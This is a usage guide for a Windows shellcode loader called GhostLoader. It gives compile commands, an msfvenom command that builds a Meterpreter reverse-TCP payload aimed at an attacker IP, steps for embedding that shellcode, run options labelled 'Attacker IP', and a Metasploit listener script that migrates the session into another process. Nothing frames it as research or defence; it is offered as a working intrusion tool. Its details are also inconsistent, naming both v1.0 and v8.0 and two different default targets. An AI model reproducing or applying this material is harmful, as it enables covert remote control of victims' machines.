GhostLoader - Complete Compilation & Usage Guide

This guide covers both ways to compile and use GhostLoader v1.0:

    Method 1: Compilation from Windows (Recommended)
    Method 2: Cross-compilation from Linux

1. Method 1: Compilation from Windows (Recommended)
Requirements

    Visual Studio 2022 (any edition)
    Windows 10/11 x64
    Administrator privileges

Step-by-Step Compilation

    Open Visual Studio 2022

    Create a new project:
        File → New → Project
        Select Empty C++ Project
        Name: GhostLoader_v1.0
        Platform: x64

    Add the 3 source files:
        main.cpp
        syscalls.h
        syscalls.asm

    Configure Project Properties (Right-click project → Properties):
        C/C++ → Advanced → Calling Convention: __fastcall
        Linker → Input → Additional Dependencies: ntdll.lib

    Build the Project:
        Set configuration to Release | x64
        Go to Build → Build Solution

    The executable will be created at:

    x64\Release\GhostLoader.exe

2. Method 2: Cross-Compilation from Linux
Requirements

    MinGW-w64 installed

Installation of MinGW-w64

Ubuntu / Debian / Kali:

sudo apt update
sudo apt install mingw-w64

Arch Linux:

sudo pacman -S mingw-w64-gcc

Compilation Command

Navigate to your project folder and run:

x86_64-w64-mingw32-g++ -O2 -o GhostLoader.exe main.cpp syscalls.asm \
  -static-libgcc -static-libstdc++ \
  -lntdll -lshlwapi \
  -Wl,--subsystem,console

Alternative Cleaner Command

x86_64-w64-mingw32-g++ -o GhostLoader.exe main.cpp syscalls.asm \
  -static -lntdll -lshlwapi

3. How to Use GhostLoader v8.0
Step 1: Generate Shellcode (Recommended)

msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=yourip \
  LPORT=4444 \
  EXITFUNC=thread \
  PrependSetRECONNECT=60 \
  -f c \
  -o shellcode.txt

Step 2: Integrate Shellcode

    Open shellcode.txt
    Copy the array content
    Paste it into main.cpp (replace the shellcode[] array)

Step 3: Run the Program

From Windows:

GhostLoader.exe

With custom parameters:

GhostLoader.exe -h yourip -p 443

Available Parameters:

    -h → Attacker IP
    -p → Port
    -t → Target DLL (default: version.dll)

4. How to Receive the Connection
Create listener.rc file:
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST yourip
set LPORT 4444
set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
exploit -j -z
Start the Listener:

msfconsole -r listener.rc

5. Summary Table
Task	Windows Command	Linux Command (Cross-compile)
Compile	Visual Studio (GUI)	x86_64-w64-mingw32-g++ ...
Run	GhostLoader.exe	Same (after copying .exe)
Generate Shellcode	msfvenom ...	Same
Receive Connection	msfconsole -r listener.rc	Same
6. Recommendations

    Best Method: Compile on Windows using Visual Studio (more reliable).
    Use RuntimeBroker.exe as target (already set by default).
    Always use EXITFUNC=thread and PrependSetRECONNECT=60 when generating shellcode.
    Run as Administrator.
